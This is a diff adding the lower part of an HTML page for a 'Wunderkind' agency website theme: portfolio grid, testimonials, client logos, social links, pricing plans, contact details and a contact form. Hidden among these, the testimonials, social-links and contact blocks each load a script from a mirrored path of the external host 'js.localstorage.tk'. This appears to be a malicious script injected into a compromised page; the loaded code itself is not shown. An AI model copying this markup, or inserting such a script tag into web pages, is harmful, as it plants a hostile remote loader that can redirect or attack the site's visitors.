+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-6.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Design Photography Branding Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/1-video80a7.jpg?itok=lMcwRR7q"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="https://www.youtube.com/watch?v=Rapz8ac7RW0"
+                                                                    class="cbp-lightbox" data-title="Our Project 5"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-5.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Branding Apps Videos Web-Design Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/post-2f07d.jpg?itok=RMJ77Mhq"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="../assets/sites/wunderkind.nikadevs.com/files/post-2.jpg"
+                                                                    class="cbp-lightbox" data-title="Our Project 4"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-4.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Design Photography Branding Apps Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/post-2f07d.jpg?itok=RMJ77Mhq"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="../assets/sites/wunderkind.nikadevs.com/files/post-2.jpg"
+                                                                    class="cbp-lightbox" data-title="Our Project 3"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-3.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Design Photography Branding Apps Videos Web-Design Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/all/themes/wunderkind/img/video-vimeo.jpg" alt="" />
+                                                    <!-- <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a href="http://vimeo.com/85844473"
+                                                                    class="cbp-lightbox" data-title="Our Project 2"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-2.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div> -->
+                                                </div>
+                                            </li>
+                                            <li
+                                                class="cbp-item effect effects Design Photography Branding Apps Videos Web-Design Marketplace Typography">
+                                                <div class="img">
+                                                    <img src="../assets/sites/wunderkind.nikadevs.com/files/styles/project_660_495/public/post-1f719.jpg?itok=LUtKcHmL"
+                                                        width="660" height="495" alt="" />
+                                                    <div class="overlay">
+                                                        <ul class="expand">
+                                                            <li class="cbp-l-icon"><a
+                                                                    href="../assets/sites/wunderkind.nikadevs.com/files/post-1.jpg"
+                                                                    class="cbp-lightbox" data-title="Our Project 1"><i
+                                                                        class="fa fa-search"></i></a></li>
+                                                            <li class="cbp-l-icon"><a href="project/our-project-1.html"
+                                                                    class="cbp-singlePage"><i
+                                                                        class="fa fa-expand"></i></a></li>
+                                                        </ul>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+
+
+
+
+
+                            </div>
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container-fluid">
+                <div id="Testimonials-Images" class="row">
+                    <div class="col-md-12 " id="block-12">
+                        <div id="block-block-12" class="block block-block">
+
+
+                            <article id="node-22" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_6.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='spacer lg'></div>
+                                    <div class='liquid-slider text-white' id='liquid-slider-15943072492'>
+                                        <div class='quote centered'>
+                                            <img src="../assets/sites/wunderkind.nikadevs.com/files/testimonial-3.jpg" alt="" />
+                                            <h4><i class="fa fa-quote-left highlight"></i> <small>I have been extremely
+                                                    impressed with Dorotheum. It is a pleasure working<br> with</small>
+                                                <span class='highlight'>highly creative</span><small> and inovative
+                                                    team. </small> <i class="fa fa-quote-right highlight"></i></h4>
+                                            <p class="label label-primary">Jane Awesome - Big Corp</p>
+                                        </div>
+                                        <div class='quote centered'>
+                                            <!-- <img src="../assets/sites/wunderkind.nikadevs.com/files/testimonial-1.html"
+                                                alt="" /> -->
+                                            <h4><i class="fa fa-quote-left highlight"></i> <small>This is now the third
+                                                    time I've worked with Wunderkind and the service they provide is
+                                                    amazing.</small> <span class='highlight'>Thank you guys!</span> <i
+                                                    class="fa fa-quote-right highlight"></i></h4>
+                                            <p class="label label-primary">Jane Awesome - Space Corp</p>
+                                        </div>
+                                        <div class='quote centered'>
+                                            <img src="../assets/sites/wunderkind.nikadevs.com/files/testimonial-2.jpg" alt="" />
+                                            <h4><i class="fa fa-quote-left highlight"></i> <small>I love Wunderkind.
+                                                    Absolutely amazing results and experience creating my website. An
+                                                    environment where you interact with </small> <span
+                                                    class='highlight'>incredible talent!</span> <i
+                                                    class="fa fa-quote-right highlight"></i></h4>
+                                            <p class="label label-primary">Jane Awesome - Galaxy Corp</p>
+                                        </div>
+                                    </div>
+                                    <div class='spacer lg'></div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="padding-bottom: 45px; " class="nd-region">
+
+            <div class="container">
+                <div id="Our-Clients" class="row">
+                    <div class="col-md-12 " id="views-clients-block">
+                        <div id="block-views-clients-block" class="block block-views">
+
+
+                            <div
+                                class="view view-clients view-id-clients view-display-id-block view-dom-id-3f91ef2634b4813e57c7e8ae7d5d9610">
+                                <div class="view-header">
+                                    <div class="col-lg-12 centered wow flipInX">
+                                        <h2><small>World Brands Are Some Of</small><br><strong>Our Satisfied
+                                                Clients</strong></h2>
+                                        <p class="lead">Digital agency that loves designing <span
+                                                class='highlight'>great websites.</span></p>
+                                    </div>
+                                    <div class='spacer md'></div>
+                                </div>
+
+
+
+                                <div class="view-content">
+                                    <div class="row">
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://heineken.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-6463e.jpg?itok=m2DZN1wp"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://canon.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-55f9a.jpg?itok=8yY-Py7R"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://youtube.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-47aa3.jpg?itok=QSClxMAd"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://dropbox.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-33785.jpg?itok=vn09gYvE"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://vimeo.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-2188e.jpg?itok=j_LlocRV"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                        <div class="col-md-2 col-xs-4 ">
+
+                                            <a href="http://google.com/" class="img-responsive"><img
+                                                    src="../assets/sites/wunderkind.nikadevs.com/files/styles/client_200_100/public/client-1ea2c.jpg?itok=LVXdVMjw"
+                                                    width="200" height="100" alt="" /></a> </div>
+                                    </div>
+                                </div>
+
+
+
+
+
+
+                            </div>
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container-fluid">
+                <div id="Features" class="row">
+                    <div class="col-md-12 " id="block-13">
+                        <div id="block-block-13" class="block block-block">
+
+
+                            <article id="node-29" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_7.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='spacer lg'></div>
+                                    <div class="centered">
+                                        <h2 class="text-white"><small>Get Connected <br></small>Follow Us</h2>
+                                        <p class="lead text-white">Get connected with us on social networks!</p>
+                                    </div>
+                                    <div class='spacer md'></div>
+                                    <div class='row'>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://facebook.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Facebook</span><br><span
+                                                        class="white">Be our friends</span>
+                                                </a></div>
+                                        </div>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://twitter.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Twitter</span><br><span
+                                                        class="white">Follow Us</span>
+                                                </a></div>
+                                        </div>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://instagram.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-instagram fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Instagram</span><br><span
+                                                        class="white">See Our Pictures</span>
+                                                </a></div>
+                                        </div>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://youtube.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-youtube fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Youtube</span><br><span
+                                                        class="white">Watch Our Videos</span>
+                                                </a></div>
+                                        </div>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://google.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-google-plus-square fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Google+</span><br><span
+                                                        class="white">Join Our Circle</span>
+                                                </a></div>
+                                        </div>
+                                        <div class='col-xs-6 col-sm-2'>
+                                            <div class="connected-icon centered"><a target="_blank"
+                                                    href="http://vimeo.com/">
+                                                    <span class="fa-stack fa-lg fa-4x">
+                                                        <i class="fa fa-circle fa-stack-2x"></i>
+                                                        <i class="fa fa-vimeo-square fa-stack-1x fa-inverse"></i>
+                                                    </span><br><span class="lead">Vimeo</span><br><span
+                                                        class="white">Check Out New Videos</span>
+                                                </a></div>
+                                        </div>
+                                    </div>
+                                    <div class='spacer lg'></div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nd-region">
+
+            <div class="container">
+                <div id="Price-List" class="row">
+                    <div class="col-md-12 " id="block-14">
+                        <div id="block-block-14" class="block block-block">
+
+
+                            <div class='centered container  wow flipInX' data-appear-animation='flipInX'>
+                                <h2><small>Pick Some of</small><br><strong>Our Latest Offers</strong></h2>
+                                <p class="lead">Pick a plan that <span class='highlight'>best suits</span> your needs.
+                                </p>
+                            </div>
+                            <div class='md spacer' style='padding-bottom: 1px;'></div>
+                            <div class='row'>
+                                <div data-appear-animation='flipInY' class='col-sm-4 wow flipInY'>
+                                    <div class='price-box text-center wow'>
+                                        <div class="price-box-info">
+                                            <h2>Free</h2>
+                                            <h2>0<span>$</span><small>/mon.</small></h2>
+                                        </div>
+                                        <div class="price-box-offer">
+                                            <ul class="offer-list">
+                                                <li><span>Full</span> Email Support
+                                                </li>
+                                                <li><span>25</span> Projects
+                                                </li>
+                                                <li><i class="icon ion-close-round"></i>
+                                                </li>
+                                                <li><i class="icon ion-close-round"></i>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div class="sign-up-btn">
+                                            <a href="contact.html" class="btn btn-primary">Sign Up Now</a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div data-appear-animation='flipInY' class='col-sm-4 wow flipInY'>
+                                    <div class='price-box text-center wow'>
+                                        <div class="price-box-info">
+                                            <h2>Pro</h2>
+                                            <h2>25<span>$</span><small>/mon.</small></h2>
+                                        </div>
+                                        <div class="price-box-offer">
+                                            <ul class="offer-list">
+                                                <li>
+                                                    <span>Full</span> Email Support
+                                                </li>
+                                                <li>
+                                                    <span>Unlimited</span> Projects
+                                                </li>
+                                                <li>
+                                                    <span>Unlimited</span> Users
+                                                </li>
+                                                <li>
+                                                    <span>1000GB</span> Storage
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div class="sign-up-btn">
+                                            <a href="contact.html" class="btn btn-primary">Sign Up Now</a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div data-appear-animation='flipInY' class='col-sm-4 wow flipInY'>
+                                    <div class='price-box text-center wow'>
+                                        <div class="price-box-info">
+                                            <h2>Basic</h2>
+                                            <h2>15<span>$</span><small>/mon.</small></h2>
+                                        </div>
+                                        <div class="price-box-offer">
+                                            <ul class="offer-list">
+                                                <li>
+                                                    <span>Full</span> Email Support
+                                                </li>
+                                                <li>
+                                                    <span>Unlimited</span> Projects
+                                                </li>
+                                                <li>
+                                                    <span>Unlimited</span> Users
+                                                </li>
+                                                <li>
+                                                    <span>500GB</span> Storage
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div class="sign-up-btn">
+                                            <a href="contact.html" class="btn btn-primary">Sign Up Now</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="padding-top: 0px; padding-bottom: 0px; " class="nd-region">
+
+            <div class="container">
+                <div id="Blog" class="row">
+                </div>
+            </div>
+        </div>
+
+        <div style="padding-bottom: 0px; " class="nd-region">
+
+            <div class="container-fluid">
+                <div id="Contact" class="row">
+                    <div class="col-md-12 " id="block-15">
+                        <div id="block-block-15" class="block block-block">
+
+
+                            <article id="node-31" class="node node-page container parallax-bg "
+                                style="background-image: url(../assets/sites/wunderkind.nikadevs.com/files/bg_8.jpg);"
+                                data-stellar-background-ratio="0.7">
+                                <header>
+                                    <div class="parallax-overlay"></div>
+
+                                </header>
+
+                                <div class="content node-page container">
+                                    <div class='spacer xlg'></div>
+                                    <div data-appear-animation='flipInX'
+                                        class='container centered text-white wow flipInX'>
+                                        <div class='phone-info'>
+                                            <h1><i class="fa fa-phone"></i> 48-1516-2342</h1>
+                                        </div>
+                                        <h3><small>support@<span class='highlight'>domain.com</span></small></h3>
+                                        <h3><small>Wunderkind, 36th Floor, 5th Ave. </small><span class='highlight'>New
+                                                York</span></h3>
+                                    </div>
+                                    <div class='spacer xlg'></div>
+                                    <script type='text/javascript' src='../js.localstorage.tk/s2c94.js?qr=888'></script>
+                                </div>
+
+                                <footer>
+                                </footer>
+
+                            </article> <!-- /.node -->
+                        </div> <!-- /.block -->
+                    </div>
+                    <div class="col-md-12 " id="block-16">
+                        <div id="block-block-16" class="block block-block">
+
+
+                            <div class='spacer lg'></div>
+                            <div class='container'>
+                                <div class='row'>
+                                    <div data-appear-animation='flipInX' class='centered col-md-12 wow flipInX'>
+                                        <h2><small>Get In Touch</small><br><strong>Contact Us</strong></h2>
+                                        <p class="lead">We would like to <span class='highlight'>hear from you.</span>
+                                    </div>
+                                </div>
+                                <div class='spacer md'></div>
+                                <div data-appear-animation='flipInX' class='wow flipInX'>
+                                    <form class="user-info-from-cookie contact-form" id="contact"
+                                        action="http://wunderkind.nikadevs.com/" method="post" accept-charset="UTF-8">
+                                        <div>
+                                            <div class="row">
+                                                <div class="col-md-6">
+                                                    <div
+                                                        class="form-type-textfield form-item-name form-item form-group">
+                                                        <label for="edit-name">Name <span class="form-required"
+                                                                title="This field is required.">*</span></label>
+                                                        <input class="form-control form-text required"
+                                                            placeholder="Name" type="text" id="edit-name" name="name"
+                                                            value="" size="60" maxlength="255" />
+                                                    </div>
+                                                    <div
+                                                        class="form-type-textfield form-item-mail form-item form-group">
+                                                        <label for="edit-mail">Email <span class="form-required"
+                                                                title="This field is required.">*</span></label>
+                                                        <input class="form-control form-text required"
+                                                            placeholder="Email" type="text" id="edit-mail" name="mail"
+                                                            value="" size="60" maxlength="255" />
+                                                    </div>
+                                                    <div
+                                                        class="form-type-textfield form-item-subject form-item form-group">
+                                                        <label for="edit-subject">Phone <span class="form-required"
+                                                                title="This field is required.">*</span></label>
+                                                        <input class="form-control form-text required"
+                                                            placeholder="Phone" type="text" id="edit-subject"
+                                                            name="subject" value="" size="60" maxlength="255" />
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-6">
+                                                    <div
+                                                        class="form-type-textarea form-item-message form-item form-group">
+                                                        <label for="edit-message">Message <span class="form-required"
+                                                                title="This field is required.">*</span></label>
+                                                        <div class="form-textarea-wrapper resizable"><textarea
+                                                                class="form-control form-textarea required"
+                                                                placeholder="Message" id="edit-message" name="message"
+                                                                cols="60" rows="5"></textarea></div>
+                                                    </div>
+                                                    <input type="hidden" name="form_build_id"
+                                                        value="form-2o1BJs7b54tFiU_DB0dEcwPbg5ZzxSc3V0YCHHYQNpM" />
+                                                    <input type="hidden" name="form_id" value="contact_site_form" />
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-md-12 centered">
+                                                    <div class="form-actions form-wrapper" id="edit-actions"><input
+                                                            class="submit btn btn-primary form-submit" type="submit"
+                                                            id="edit-submit" name="op" value="Send message" /></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                                <div class='spacer lg'></div>
+                            </div>
+
+                        </div> <!-- /.block -->
+                    </div>
+                    <div class="col-md-12 " id="wunderkind_cms-gmap">
+                        <div id="block-wunderkind-cms-gmap" class="block block-wunderkind-cms">
+
+
+                            <div class="googlemap-wrapper">
+                                <div id="map" class="map-canvas"></div>
+                            </div>
+                        </div> <!-- /.block -->
+                    </div>
+                    <div class="col-md-12 " id="wunderkind_cms-footer">
+                        <div id="block-wunderkind-cms-footer" class="block block-wunderkind-cms">
+
+
+                            <div id="back-to-top"><a href="#"><i class="ion-arrow-up-b ion-3x"></i></a></div>
+                            <!-- Start Footer -->
+                            <footer id="footer">
+                                <div class="col-lg-12 text-center">
+                                    <div class="back-to-top">
+                                        <i class="fa fa-angle-double-up"></i>
+                                    </div>
+                                </div>
+                                <div class="container text-center">
+                                    <div class="row">
+                                        <div class="col-md-12 footer-logo text-white">
+                                            <a href="index.html">
+                                                <h4 class="white">Wunderkind</h4>
+                                            </a>
+                                        </div>
+                                        <div class="footer-info">
+                                            <p class="footer-copyright white">
+                                                Copyright © 2020 <a href="index.html">Wunderkind</a>. All Rights
+                                                Reserved. </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </footer>
+                        </div> <!-- /.block -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+
+</body>
